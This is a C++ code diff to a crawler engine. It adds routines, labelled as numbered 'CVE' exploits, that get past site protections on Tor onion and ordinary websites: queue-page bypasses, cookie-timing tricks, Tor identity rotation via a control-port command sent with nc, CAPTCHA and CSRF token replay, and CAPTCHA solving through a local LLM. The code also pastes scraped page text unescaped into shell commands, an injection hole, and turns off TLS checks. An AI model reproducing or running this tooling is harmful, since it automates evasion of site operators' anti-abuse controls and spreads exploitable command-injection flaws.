@@ -3,6 +3,7 @@
 #include <algorithm>
 #include <array>
 #include <chrono>
+#include <regex>
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
@@ -2176,6 +2177,14 @@ std::string SynapsedEngine::fetchWithRetry(const std::string& url, int maxRetrie
                 exploited = exploitCVE0007_CfManagedBypass(html, url, httpCode);
             else if (vuln.cveId == "NAAN-CVE-2026-0002")
                 exploited = exploitCVE0002_QueueRace(url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0011")
+                exploited = exploitCVE0011_QueueRefreshBypass(url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0012")
+                exploited = exploitCVE0012_QueueCookieTTL(url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0013")
+                exploited = exploitCVE0013_QueueNewnym(url);
+            else if (vuln.cveId == "NAAN-CVE-2026-0014")
+                exploited = exploitCVE0014_CaptchaTokenReplay(html, url);
             else if (vuln.cveId == "NAAN-CVE-2026-0010") {
                 recordBypass(vuln.cveId, vuln.protectionType, vuln.bypassMethod,
                     isOnion ? "tor" : "clearnet", ttfbMs, httpCode, html.size());
@@ -2414,6 +2423,68 @@ std::string SynapsedEngine::fetchWithRetry(const std::string& url, int maxRetrie
             return html;
         }
 
+        if (darkCap.detected && !darkCap.solved && modelLoaded_) {
+            std::string capImg;
+            auto imgM = std::regex_search(html, std::smatch{},
+                std::regex("<img[^>]+src=[\"']([^\"']*captcha[^\"']*)", std::regex::icase));
+            std::smatch imgMatch;
+            if (std::regex_search(html, imgMatch,
+                std::regex("<img[^>]+src=[\"']([^\"']*(?:captcha|cap)[^\"']*)[\"']", std::regex::icase))) {
+                capImg = downloadCaptchaImage(imgMatch[1].str());
+            }
+            std::string llmAnswer = solveCaptchaViaLLM(html, capImg, url);
+            if (!llmAnswer.empty()) {
+                std::string formAction = url;
+                std::string formField = "captcha";
+                size_t fTag = html.find("<form");
+                if (fTag != std::string::npos) {
+                    size_t actP = html.find("action=\"", fTag);
+                    if (actP != std::string::npos && actP < fTag + 500) {
+                        actP += 8;
+                        size_t actE = html.find('"', actP);
+                        if (actE != std::string::npos) {
+                            std::string act = html.substr(actP, actE - actP);
+                            if (!act.empty() && act[0] == '/') {
+                                size_t slP = url.find('/', url.find("://") + 3);
+                                formAction = url.substr(0, slP) + act;
+                            }
+                        }
+                    }
+                }
+                std::string postData = formField + "=" + llmAnswer;
+                for (const auto& tok : {"_token", "csrf", "csrf_token"}) {
+                    std::string sr = std::string("name=\"") + tok + "\"";
+                    size_t tp = html.find(sr);
+                    if (tp != std::string::npos) {
+                        size_t vp = html.find("value=\"", tp);
+                        if (vp != std::string::npos && vp < tp + 200) {
+                            vp += 7;
+                            size_t ve = html.find('"', vp);
+                            if (ve != std::string::npos)
+                                postData += "&" + std::string(tok) + "=" + html.substr(vp, ve - vp);
+                        }
+                    }
+                }
+                std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";
+                std::string cookieArg = isOnion ?
+                    "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt " :
+                    "-c " + dataDir_ + "/clearnet_cookies.txt -b " + dataDir_ + "/clearnet_cookies.txt ";
+                std::string llmCmd = "curl -s -k --max-time 30 " + socksArg + "-L " +
+                    cookieArg + "-H \"User-Agent: " + randomUserAgent() + "\" "
+                    "-d \"" + postData + "\" \"" + formAction + "\" 2>/dev/null";
+                std::string llmResult = execCmd(llmCmd);
+                if (!llmResult.empty() &&
+                    llmResult.find("captcha") == std::string::npos &&
+                    llmResult.find("invalid") == std::string::npos &&
+                    llmResult.find("wrong") == std::string::npos) {
+                    recordBypass("NAAN-LLM-CAPTCHA", "captcha_unsolved",
+                        "llm_model_solve", isOnion ? "tor" : "clearnet",
+                        ttfbMs, 200, llmResult.size());
+                    return llmResult;
+                }
+            }
+        }
+
         std::this_thread::sleep_for(std::chrono::seconds(3));
     }
     return "";
@@ -2531,7 +2602,30 @@ SynapsedEngine::VulnDetectionResult SynapsedEngine::detectVulnerability(
         return result;
     }
 
-    // CVE-0010: No protection at all
+    if (html.find("type=\"hidden\"") != std::string::npos ||
+        html.find("type='hidden'") != std::string::npos) {
+        size_t pos = 0;
+        std::string hiddenSearch = "type=\"hidden\"";
+        while ((pos = html.find(hiddenSearch, pos)) != std::string::npos) {
+            size_t valP = html.find("value=\"", pos);
+            if (valP != std::string::npos && valP < pos + 200) {
+                size_t valEnd = html.find('"', valP + 7);
+                if (valEnd != std::string::npos) {
+                    std::string val = html.substr(valP + 7, valEnd - valP - 7);
+                    if (val.size() > 24) {
+                        result.cveId = "NAAN-CVE-2026-0014";
+                        result.protectionType = "captcha_token_static";
+                        result.bypassMethod = "token_replay";
+                        result.exploitable = true;
+                        result.confidence = 0.75;
+                        return result;
+                    }
+                }
+            }
+            pos++;
+        }
+    }
+
     if (httpCode == 200 && html.size() > 1000 &&
         html.find("captcha") == std::string::npos &&
         html.find("challenge") == std::string::npos) {
@@ -2909,6 +3003,217 @@ std::string SynapsedEngine::exploitCVE0009_CookieConfusion(
     }
 
     return "";
+}
+
+std::string SynapsedEngine::exploitCVE0011_QueueRefreshBypass(
+    const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+    bool isOnion = url.find(".onion") != std::string::npos;
+    std::string cookieFile = dataDir_ + "/tor_cookies.txt";
+    std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";
+
+    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
+        "-c " + cookieFile + " -b " + cookieFile + " "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string first = execCmd(cmd);
+    if (first.empty()) return "";
+
+    if (first.find("queue") == std::string::npos && first.find("Queue") == std::string::npos)
+        return first;
+
+    std::this_thread::sleep_for(std::chrono::seconds(2));
+
+    std::string retry = execCmd(cmd);
+    if (!retry.empty() && retry.find("queue") == std::string::npos &&
+        retry.find("Queue") == std::string::npos) {
+        return retry;
+    }
+    return retry;
+}
+
+std::string SynapsedEngine::exploitCVE0012_QueueCookieTTL(
+    const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+    bool isOnion = url.find(".onion") != std::string::npos;
+    std::string cookieFile = dataDir_ + "/queue_ttl_cookies.txt";
+    std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";
+
+    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
+        "-c " + cookieFile + " -b " + cookieFile + " "
+        "-D - -H \"User-Agent: " + randomUserAgent() + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string resp = execCmd(cmd);
+
+    size_t maxAgeP = resp.find("Max-Age=");
+    size_t refreshP = resp.find("Refresh:");
+    if (maxAgeP == std::string::npos || refreshP == std::string::npos) return "";
+
+    int maxAge = std::atoi(resp.c_str() + maxAgeP + 8);
+    int refreshVal = std::atoi(resp.c_str() + refreshP + 8);
+
+    if (maxAge <= refreshVal || refreshVal <= 0) return "";
+
+    int waitSec = refreshVal + 1;
+    std::this_thread::sleep_for(std::chrono::seconds(waitSec));
+
+    std::string retry = "curl -s -k --max-time 30 " + socksArg + "-L "
+        "-b " + cookieFile + " -c " + cookieFile + " "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string result = execCmd(retry);
+
+    if (!result.empty() && result.find("queue") == std::string::npos)
+        return result;
+    return "";
+}
+
+std::string SynapsedEngine::exploitCVE0013_QueueNewnym(
+    const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+    if (url.find(".onion") == std::string::npos) return "";
+
+    system("(echo AUTHENTICATE \"\" && echo SIGNAL NEWNYM && echo QUIT) | "
+           "nc 127.0.0.1 9151 2>/dev/null");
+    std::this_thread::sleep_for(std::chrono::seconds(5));
+
+    std::string cmd = "curl -s -k --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "\"" + url + "\" 2>/dev/null";
+    std::string result = execCmd(cmd);
+
+    if (!result.empty() && result.find("queue") == std::string::npos &&
+        result.find("Queue") == std::string::npos) {
+        return result;
+    }
+    return "";
+}
+
+std::string SynapsedEngine::exploitCVE0014_CaptchaTokenReplay(
+    const std::string& html, const std::string& url) const {
+    if (!isUrlSafe(url)) return "";
+
+    auto it = captchaTokenCache_.find(url);
+    std::string cachedToken;
+    if (it != captchaTokenCache_.end()) {
+        cachedToken = it->second;
+    }
+
+    std::string formAction = url;
+    size_t formTag = html.find("<form");
+    if (formTag != std::string::npos) {
+        size_t actP = html.find("action=\"", formTag);
+        if (actP != std::string::npos && actP < formTag + 500) {
+            actP += 8;
+            size_t actE = html.find('"', actP);
+            if (actE != std::string::npos) {
+                std::string act = html.substr(actP, actE - actP);
+                if (!act.empty() && act[0] == '/') {
+                    size_t slashP = url.find('/', url.find("://") + 3);
+                    formAction = url.substr(0, slashP) + act;
+                } else if (!act.empty() && act.find("http") == 0) {
+                    formAction = act;
+                }
+            }
+        }
+    }
+
+    std::string tokenField, tokenValue;
+    std::string search = "type=\"hidden\"";
+    size_t pos = 0;
+    while ((pos = html.find(search, pos)) != std::string::npos) {
+        size_t inputStart = html.rfind("<input", pos);
+        if (inputStart == std::string::npos) { pos++; continue; }
+        size_t inputEnd = html.find('>', pos);
+        if (inputEnd == std::string::npos) { pos++; continue; }
+        std::string inp = html.substr(inputStart, inputEnd - inputStart + 1);
+
+        size_t nameP = inp.find("name=\"");
+        size_t valP = inp.find("value=\"");
+        if (nameP != std::string::npos && valP != std::string::npos) {
+            size_t nq = inp.find('"', nameP + 6);
+            std::string nm = inp.substr(nameP + 6, nq - nameP - 6);
+            size_t vq = inp.find('"', valP + 7);
+            std::string vl = inp.substr(valP + 7, vq - valP - 7);
+            if (vl.size() > 20) {
+                tokenField = nm;
+                tokenValue = vl;
+                captchaTokenCache_[url] = vl;
+                break;
+            }
+        }
+        pos = inputEnd;
+    }
+
+    if (tokenValue.empty() && !cachedToken.empty()) {
+        tokenField = "csrf_token";
+        tokenValue = cachedToken;
+    }
+    if (tokenValue.empty()) return "";
+
+    bool isOnion = url.find(".onion") != std::string::npos;
+    std::string socksArg = isOnion ? "--socks5-hostname 127.0.0.1:9050 " : "";
+    std::string postData = tokenField + "=" + tokenValue;
+    std::string cmd = "curl -s -k --max-time 30 " + socksArg + "-L "
+        "-H \"User-Agent: " + randomUserAgent() + "\" "
+        "-d \"" + postData + "\" "
+        "\"" + formAction + "\" 2>/dev/null";
+    std::string result = execCmd(cmd);
+
+    if (!result.empty() && result.find("captcha") == std::string::npos &&
+        result.find("invalid") == std::string::npos) {
+        return result;
+    }
+    return "";
+}
+
+std::string SynapsedEngine::solveCaptchaViaLLM(const std::string& html,
+    const std::string& imgPath, const std::string& url) const {
+    if (!modelLoaded_) return "";
+
+    std::string prompt;
+    if (!imgPath.empty()) {
+        prompt = "You are solving a CAPTCHA. The image has been saved to: " + imgPath +
+                 "\nAnalyze the image and return ONLY the text/numbers shown in the CAPTCHA. "
+                 "No explanation, just the answer.";
+    } else {
+        size_t capStart = html.find("captcha");
+        if (capStart == std::string::npos) capStart = html.find("CAPTCHA");
+        if (capStart == std::string::npos) return "";
+
+        size_t contextStart = (capStart > 500) ? capStart - 500 : 0;
+        size_t contextEnd = std::min(capStart + 2000, html.size());
+        std::string context = html.substr(contextStart, contextEnd - contextStart);
+
+        prompt = "Analyze this HTML fragment containing a CAPTCHA challenge. "
+                 "Determine the correct answer. Return ONLY the answer, nothing else.\n\n" + context;
+    }
+
+    std::string tmpPrompt = dataDir_ + "/llm_captcha_prompt.txt";
+    std::string tmpResp = dataDir_ + "/llm_captcha_resp.txt";
+    {
+        std::ofstream f(tmpPrompt);
+        f << prompt;
+    }
+
+    std::string cmd = "cd " + dataDir_ + " && echo '" + prompt.substr(0, 500) +
+                      "' | timeout 30 llama-cli -m " + modelPath_ +
+                      " -n 32 -p - 2>/dev/null | tail -1 > " + tmpResp;
+    system(cmd.c_str());
+
+    std::ifstream respFile(tmpResp);
+    std::string answer;
+    if (respFile.good()) {
+        std::getline(respFile, answer);
+        while (!answer.empty() && (answer.back() == '\n' || answer.back() == '\r' || answer.back() == ' '))
+            answer.pop_back();
+        while (!answer.empty() && (answer.front() == ' ' || answer.front() == '"'))
+            answer.erase(answer.begin());
+    }
+    std::remove(tmpPrompt.c_str());
+    std::remove(tmpResp.c_str());
+
+    return answer;
 }
 
 std::string SynapsedEngine::topicToUrl(const std::string& topic) const {
